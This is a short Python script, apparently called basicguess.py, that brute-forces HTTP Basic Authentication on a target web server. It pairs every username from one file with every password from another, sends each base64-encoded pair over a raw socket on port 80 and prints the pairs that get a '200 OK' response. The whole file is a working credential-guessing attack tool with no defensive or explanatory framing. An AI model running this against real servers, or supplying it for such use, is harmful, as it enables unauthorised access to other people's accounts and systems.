import sys, socket, base64

def createBase64File():
	print("Creating Base 64 file...")
	with open('b64file', 'w') as b64file:
		users = open(sys.argv[2], 'r')
		passwds = open(sys.argv[3], 'r')
		for user in users:
			for passwd in passwds:
				b64file.write(str(base64.b64encode(bytes(user.strip()+":"+passwd.strip(), 'utf-8')), 'utf-8')+"\n")
			passwds.seek(0) # go back to start of passwds file for next username
		users.close()
		passwds.close()

def main():
	if len(sys.argv) != 4:
		print("Usage: python3 basicguess.py [url-without-http://] [usernames-file] [passwords-file]")
		sys.exit()
	else:
		createBase64File()
		print("Done.")
		path = "/"
		url = sys.argv[1].split("/", 1)
		if len(url) == 2:
			host, path = url[0], "/"+url[1]
		else:
			host = url[0]
		with open('b64file', 'r') as b64file:
			for b64auth in b64file:
				b64auth = b64auth.strip()
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, 80))
				req = "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: Close\r\nAuthorization: Basic " + b64auth + "\r\n\r\n"
				s.sendall(bytes(req, 'utf-8'))
				resp = bytes()
				while True:
					data = s.recv(1024)
					if not data:
						break
					resp += data
				resp = str(resp)
				if "200 OK" in resp:
					print("Valid login: ", str(base64.b64decode(b64auth), 'utf-8'))
	
	return 0

if __name__ == '__main__':
	main()
